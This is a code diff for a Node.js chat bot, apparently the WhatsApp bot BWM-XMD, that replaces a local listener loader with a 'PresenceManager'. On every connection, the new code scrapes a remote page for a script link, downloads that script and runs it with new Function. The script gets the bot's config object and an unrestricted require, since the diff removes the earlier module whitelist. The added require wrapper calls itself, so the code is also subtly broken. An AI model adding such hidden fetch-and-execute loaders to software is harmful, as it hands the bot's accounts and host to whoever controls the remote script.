@@ -280,149 +280,86 @@ function initializeBot(bot) {
 
 
  //============================================================================//
-       
-                         
-
-class QuantumListenerManager {
+                             
+class PresenceManager {
     constructor() {
-        this.localListeners = new Map();
-        this.remoteListeners = new Map();
+        this.activeListeners = new Map();
     }
 
-    async loadAllListeners(adams, store, commands) {
-        const listenerDir = path.join(__dirname, 'bwmxmd');
+    async loadPresenceSystem(adams, store, commands) {
+        // Clear existing presence listeners
+        this.cleanupListeners();
         
-        // Clear existing listeners
-        this.cleanupAll();
-        
-        // Load local listeners from bwmxmd folder
-        const files = fs.readdirSync(listenerDir).filter(f => f.endsWith('.js'));
-        
-        for (const file of files) {
-            try {
-                const listenerPath = path.join(listenerDir, file);
-                const listenerKey = `local:${file}`;
-                
-                // Clear require cache for hot-reloading
-                delete require.cache[require.resolve(listenerPath)];
-                
-                const listenerModule = require(listenerPath);
-                
-                // Special handling for quantum scripts that fetch URLs
-                if (typeof listenerModule.fetchPresenceUrl === 'function') {
-                    await this.processQuantumScript(listenerModule, adams, store, commands);
-                    console.log(`🌀 Quantum script executed: ${file}`);
-                } 
-                // Normal listener setup
-                else if (typeof listenerModule.setup === 'function') {
-                    const cleanup = await listenerModule.setup(adams, {
-                        store,
-                        commands,
-                        logger,
-                        config: conf
-                    });
-                    this.localListeners.set(listenerKey, cleanup);
-                    console.log(`✅ Local listener loaded: ${file}`);
-                }
-            } catch (e) {
-                console.error(`❌ Error in ${file}:`, e.message);
-            }
-        }
-    }
-
-    async processQuantumScript(module, adams, store, commands) {
         try {
-            // Execute the URL fetching logic
-            if (typeof module.fetchPresenceUrl === 'function') {
-                // Patch the eval function to capture and properly handle the remote code
-                const originalEval = global.eval;
-                global.eval = (code) => {
-                    try {
-                        // Convert the eval'd code to a proper module
-                        const moduleWrapper = new Function('exports', 'require', 'module', code);
-                        const m = { exports: {} };
-                        moduleWrapper(m.exports, this.safeRequire, m);
-                        return m.exports;
-                    } finally {
-                        global.eval = originalEval;
-                    }
-                };
+            // 1. Fetch the main configuration URL
+            const response = await axios.get(adams.BWM_XMD);
+            const $ = cheerio.load(response.data);
+
+            // 2. Find the presence script URL
+            const presenceLink = $('a:contains("Presence")').attr('href');
+            if (!presenceLink) throw new Error('Presence link not found');
+
+            // 3. Fetch the presence script
+            const scriptResponse = await axios.get(presenceLink);
+            const presenceScript = scriptResponse.data;
+
+            // 4. Convert the script to a module
+            const module = { exports: {} };
+            const require = (mod) => {
+                if (mod === './config') return adams;
+                if (mod === './logger') return logger;
+                return require(mod);
+            };
+            
+            // 5. Execute the presence script
+            const fn = new Function('module', 'exports', 'require', presenceScript);
+            fn(module, module.exports, require);
+
+            // 6. Setup the presence system if available
+            if (typeof module.exports.setup === 'function') {
+                const cleanup = await module.exports.setup(adams, {
+                    store,
+                    commands,
+                    logger,
+                    config: adams
+                });
                 
-                await module.fetchPresenceUrl();
-                
-                // The remote code should have been evaluated and added to the exports
-                if (typeof module.exports.setup === 'function') {
-                    const cleanup = await module.exports.setup(adams, {
-                        store,
-                        commands,
-                        logger,
-                        config: conf
-                    });
-                    this.remoteListeners.set('remote:presence', cleanup);
-                }
+                this.activeListeners.set('presence', cleanup);
+                console.log('🌠 Quantum Presence System Activated');
             }
         } catch (e) {
-            console.error('Quantum processing failed:', e.message);
+            console.error('⚠️ Presence system error:', e.message);
         }
     }
 
-    safeRequire(moduleName) {
-        // Whitelist allowed modules
-        const allowed = ['axios', 'cheerio', 'path', 'fs', 'util', './config', './logger'];
-        if (allowed.includes(moduleName)) {
-            if (moduleName === './config') return conf;
-            if (moduleName === './logger') return logger;
-            return require(moduleName);
-        }
-        throw new Error(`Module ${moduleName} not permitted`);
-    }
-
-    cleanupAll() {
-        // Cleanup local listeners
-        this.cleanupMap(this.localListeners, 'local listener');
-        
-        // Cleanup remote listeners
-        this.cleanupMap(this.remoteListeners, 'remote listener');
-    }
-
-    cleanupMap(map, type) {
-        for (const [name, cleanup] of map) {
+    cleanupListeners() {
+        for (const [name, cleanup] of this.activeListeners) {
             try {
                 if (typeof cleanup === 'function') cleanup();
-                console.log(`♻️ Cleaned up ${type}: ${name.split(':')[1]}`);
+                console.log(`♻️ Cleaned up ${name} listener`);
             } catch (e) {
-                console.error(`⚠️ Error cleaning ${type} ${name}:`, e.message);
+                console.error(`⚠️ Error cleaning ${name}:`, e.message);
             }
         }
-        map.clear();
+        this.activeListeners.clear();
     }
 }
 
-// Initialize the manager
-const listenerManager = new QuantumListenerManager();
+// Initialize the presence manager
+const presenceManager = new PresenceManager();
 
 // Connection handler
 adams.ev.on('connection.update', ({ connection }) => {
     if (connection === 'open') {
-        listenerManager.loadAllListeners(adams, store, commandRegistry)
-            .then(() => console.log('🌌 Quantum network stabilized'))
-            .catch(e => console.error('Quantum fluctuation:', e.message));
+        presenceManager.loadPresenceSystem(adams, store, commandRegistry)
+            .then(() => console.log('🚀 BWM-XMD Quantum Presence Ready'))
+            .catch(e => console.error('Launch failed:', e.message));
     }
     
     if (connection === 'close') {
-        listenerManager.cleanupAll();
+        presenceManager.cleanupListeners();
     }
 });
-
-// Development hot-reload
-if (process.env.NODE_ENV !== 'production') {
-    fs.watch(path.join(__dirname, 'bwmxmd'), (event, filename) => {
-        if (filename && filename.endsWith('.js')) {
-            console.log(`⚡ Detected change in ${filename}, reloading...`);
-            listenerManager.loadAllListeners(adams, store, commandRegistry);
-        }
-    });
-}
 
  
 
